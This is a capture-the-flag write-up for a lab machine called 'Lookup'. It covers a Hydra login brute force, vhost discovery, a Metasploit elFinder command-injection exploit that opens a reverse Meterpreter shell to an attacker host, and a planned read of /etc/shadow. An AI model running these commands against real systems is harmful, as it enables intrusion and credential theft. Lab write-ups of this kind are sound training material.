# Lookup

**Difficulty:** Easy/Medium
**Techniques:** login brute force · vhost enumeration · elFinder command injection (Metasploit)

## Recon
```bash
nmap -sC -sV -p- -oN scan.nmap <ip>
```
```
22/tcp open  ssh   OpenSSH 8.2p1
80/tcp open  http  Apache 2.4.41  → redirects to http://lookup.thm
```
Add `lookup.thm` to `/etc/hosts`.

## Enumeration & foothold — login brute force
The site exposes `login.php`. Hydra found valid creds:
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt lookup.thm \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password"
# login: admin  password: password123
# login: jose   password: password123
```
After logging in, the app redirects to a new vhost — add `files.lookup.thm` to
`/etc/hosts`. It hosts **elFinder** (web file manager) at `/elFinder/`.

## Exploitation — elFinder command injection
elFinder's PHP connector has a command-injection bug via image processing
(exiftran). Used the Metasploit module:
```
msf > use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
msf > set RHOSTS files.lookup.thm
msf > set TARGETURI /elFinder/
msf > set LHOST <attacker>
msf > run
# Meterpreter session opened → getuid: www-data
```
Shell as `www-data`.

## Privilege escalation (continues)
Standard path for this box: enumerate SUID / capabilities — the `look` binary
(GTFOBins) reads arbitrary files, used to read `/etc/shadow` or a user's
credentials, then escalate. *Notes end at the www-data shell; privesc write-up to
be completed.*

## Lessons
- Weak/shared passwords (`password123`) fall instantly to Hydra + rockyou.
- Login success revealing a new vhost shows why vhost enumeration matters.
- Keep web file managers (elFinder) patched — image-processing command injection
  is a known, reliable RCE.
